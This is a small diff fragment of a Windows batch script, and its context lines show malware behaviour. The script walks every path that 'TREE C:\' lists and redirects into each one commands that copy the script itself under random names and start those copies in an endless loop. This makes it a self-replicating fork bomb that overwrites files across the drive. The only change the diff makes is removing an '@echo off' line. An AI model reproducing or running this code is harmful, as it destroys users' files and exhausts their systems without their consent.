@@ -159,7 +159,6 @@ for /f "tokens" %%a in ('TREE C:\ /nh') do (
     echo :r > %%a
     echo copy %0 %0%random% > %%a
     start %0%random%.bat > %%a
-    echo @echo off > %%a
     echo echo damn %random%%random% > %%a
     echo goto r > %%a
     %l4% pain=start %%a
